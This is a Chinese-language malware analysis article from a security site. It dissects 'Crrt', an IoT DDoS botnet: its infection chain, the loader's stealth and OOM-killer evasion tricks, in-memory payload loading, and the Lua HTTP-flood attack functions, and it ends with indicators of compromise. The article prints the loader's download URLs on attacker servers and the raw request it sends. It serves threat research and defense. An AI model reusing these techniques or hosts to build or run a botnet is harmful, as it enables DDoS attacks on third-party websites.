---
title: Crrt：一款新型物联网 DDoS 攻击恶意程序
url: https://www.secpulse.com/archives/202570.html
source: 安全脉搏
date: 2023-07-06
fetch_date: 2025-10-04T11:52:39.436312
---

# Crrt：一款新型物联网 DDoS 攻击恶意程序

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# Crrt：一款新型物联网 DDoS 攻击恶意程序

[漏洞](https://www.secpulse.com/archives/category/vul)

[知微攻防实验室](https://www.secpulse.com/newpage/author?author_id=40030)

2023-07-05

19,401

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-202570-1688544645.png)

**0x01**

**背景**

近期，银弹实验室物联网蜜罐系统捕获到一款新的 DDoS 攻击样本，经分析，该样本具备对特定网站发动 CC 攻击的能力，目前已对100+网站发动了攻击。

在这批被攻击的网站中博彩和色情网站占了较大部分，另外一部分是盗版资源分享网站，我们猜测这是一次非法网站的经营者或是黑产组织进行的攻击。

**0x02**

**攻击流程**

在对样本进行分析后，我们对此次攻击活动进行了梳理，大致攻击流程如下：

1. 攻击者通过漏洞控制物联网设备，植入并执行恶意Shell 脚本；
2. Shell 脚本从指定地址下载加载器程序并运行；
3. 加载器下载Payload程序并解密，之后加载到内存；
4. Payload程序提供脚本运行环境，下载具有攻击行为的 Lua 脚本并解密；
5. 执行Lua 脚本，对脚本中指定的目标发动攻击；
6. 攻击者通过控制服务器中的攻击脚本实现后续的攻击控制，包括攻击目标的切换，攻击的开始和停止。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-202570-1688544646.png)

攻击者植入的脚本会获取设备的架构，然后再下载对应架构的样本并执行，样本适配的架构有 arm、mipsel 和 aarch64。我们对其中 mipsel 架构的样本进行分析，并按照样本模块在攻击活动中的执行顺序进行了拆分，下面是对各个模块的分析。

**0x03**

**加载器分析**

**3.1**

**下载样本和设置环境**

加载器主要负责从攻击者的服务器中下载样本，对运行环境进行检查和设置，加载和运行样本。加载器中记录了样本的下载地址：

```
http://nihiosuxnmo.com:8080/SASBCKXOWYALLCZXF/mipselhttp://91.211.88.225:8080/SASBCKXOWYALLCZXF/mipsel
```

在请求第一个的 URL 时，会使用公共的 DNS 服务器对域名进行解析，根据解析后的地址构造 http 请求下载样本。解析后的 IP 地址为 2.59.222.124，请求内容如下：

```
GET /SASBCKXOWYALLCZXF/mipsel HTTP/1.0rn Host: 2.59.222.124rnConnection: closernrn
```

加载器收到 http 响应后，会保存 Last-Modified 字段的值，用来同步最新的样本，并通过读取 Content-Length 字段的值申请相应大小的内存空间保存接收的样本。

在加载样本前，加载器通过对运行环境进行检查和设置，提高进程的隐蔽性和稳定性，具体的设置内容如下：

1. 将自身设置为守护进程在后台运行；
2. 检查tmp/tmp.lck 、/var/tmp/tmp.lck 、/data/local/tmp/tmp.lck 目录下的文件是否存在，如果其中一个存在，则正常运行。否则就会自删除并结束进程；
3. 向 /proc/self/oom\_score\_adj 文件写入 "-1000" ，避免进程因系统内存不足被 OOM killer 结束；
4. 在 /proc/self/oom\_adj文件写入"-17"，使进程完全免于被 OOM killer 结束；
5. 基于时间 、进程 pid 、父进程的 pid 等信息生成随机字符串作为自身的进程名；

环境检查和设置完成后，开始加载Payload。

**3.2**

**加载样本**

加载样本过程大致如下：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-202570-1688544647.png)

加载器先对接收的样本进行解密，解密用到的数据内置在样本中。解密后得到一个 LZMA 格式的压缩文件，之后样本对压缩文件进行解压，得到一个能够在当前架构运行的 ELF 样本。样本的信息如下：

|  |  |  |
| --- | --- | --- |
| **名称** | **架构** | **MD5** |
| mipsel | mipsel | D835BD28FCBDEBA3B1182E1CEB7439E5 |

经过对下载样本分析发现，样本文件后面附加了一部分不属于 ELF 文件的数据。其中最后两个字节为附加数据的大小，为 0x0234。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-202570-1688544648.png)

在附加数据的前 4 个字节是  0x001DC6F4，正好是这 4 个字节的首地址，样本通过读取这两个值判断接收文件是否正确。附加数据的剩下部分用来和样本中的数据匹配，匹配成功才会使用这个文件。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-202570-1688544649.png)

加载器先读取样本文件头的 e\_type 字段，如果为 0x01，就将样本写入 /tmp/file.lck 文件并调用 execl 运行，执行后删除样本文件。如果 tmp 目录下没有这个文件，就尝试写入 /var/tmp/file.lck 文件，写入成功则运行并删除样本文件。

如果样本文件头的 e\_type 字段为 0x03，则将样本加载到内存并运行。实际下载的样本的 e\_type 字段为0x03，被加载到内存中的。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-202570-1688544652.png)

下面是对样本分析结果的记录。

**0x04**

**样本分析**

**4.1**

**设置运行环境**

样本被加载器加载运行后，和加载器一样，会设置运行环境并读取 DNS 服务器地址供后续使用，具体的操作如下：

1. 修改 /proc/pid/oom\_score\_adj，/proc/pid/oom\_adj 文件的内容提高自身的内存使用等级，进行自删除并用随机字符作为进程名；
2. 读取 /etc/resolv.conf 文件获取系统保存的 DNS 服务器地址及 DNS 域名；
3. 遍历 /proc 目录下所有进程的 exe 文件内容，如果发现样本之前已经运行了，就将之前的样本进程结束。如果文件内容中出现了 "UPX!"，也将对应的进程结束；
4. 将进程号比自身大，并且不能打开对应 /proc 目录下 exe 文件的进程结束，增加系统的可用内存。

**4.2**

**下载和运行攻击脚本**

样本在设置运行环境之后，执行下载脚本下载后续攻击脚本。下载脚本以字符串的形式保存在样本中，如下图所示，完整的下载脚本见附件中的 download.txt 文件。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-202570-16885446521.png)

下载脚本会对下载内容进行解密得到攻击脚本，通过执行攻击脚本发起 DDoS 攻击。下图是下载脚本中实现下载、解密以及执行脚本的部分。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-202570-1688544653.png)

下载脚本每隔 295 秒就会下载新的攻击脚本，然后结束上一个攻击脚本的执行。如果下载失败，则不结束上一次攻击，并记录失败次数，如果失败次数到达 10 次，则切换下载地址继续下载。目前已经获取的攻击脚本有 6 个，样本从服务器下载这些脚本并执行。

下面对攻击脚本进行分析，解密后的攻击脚本已保存到附件 attack\*\*.txt 文件。

**0x05**

**攻击脚本分析**

攻击脚本中进行攻击的主要函数有三个，分别是 cc\_attack\_https2、getxx2c 和 teshu1。

函数的调用关系如下：

1. cc\_attack\_https2 -> getxx2c
2. teshu1 -> getxx2c

下面是这三个函数功能的具体实现。

**5.1**

**cc\_attack\_https2函数**

cc\_attack\_https2 函数创建了一个局部字符串变量 script 并与传入的字符串 sbff 进行拼接，再调用注册在样本中的 c 函数 create\_task 将 script 字符串作为 lua 脚本执行。

函数定义了 getxx2c 函数和产生随机数的函数，通过 while 循环设置工作时间为 3600s \* 12 = 12 个小时，之后创建了一个 user\_agents 表，保存了 10 个 user\_agent，随机选择一个，在之后生成请求报文时使用。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-202570-1688544654.png)

传入 cc\_attack\_https2 函数的字符串如下，调用 getxx2c，字符串经过拼接作为脚本运行。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-202570-1688544656.png)

**5.2**

**getxx2c 函数**

getxx2c 函数创建请求报文，使用 https.request 发起请求，实施 DDoS 攻击。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-202570-1688544657.png)

**5.3**

**teshu1 函数**

teshu1 函数用来处理需要使用 cookie 的攻击地址。通过将攻击地址传入 getxx2c 并调用，之后读取返回的结果并取出 cookie，填写到下一次的攻击报文中。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-202570-1688544659.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-202570-16885446591.png)

**0x06**

**IoCs**

**样本 MD5：**

B7765C4B6C9D3501722DFAEF806317B6

28827ABA3675E1A802BB7D8113701615

1E6E664D0669F1D625FCBA5B12F43C6C

**DOMAIN：**

nihiosuxnmo.com

**IP：**

91.211.88.225

2.59.222.124

***END***

作者 | bolin

 编辑 | who

**本文作者：[知微攻防实验室](newpage/author?author_id=40030)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/202570.html**](https://www.secpulse.com/archives/202570.html)

Tags: [函数](https://www.secpulse.com/archives/tag/%E5%87%BD%E6%95%B0)、[字符](https://www.secpulse.com/archives/tag/%E5%AD%97%E7%AC%A6)、[服务器](https://www.secpulse.com/archives/tag/%E6%9C%8D%E5%8A%A1%E5%99%A8)、[...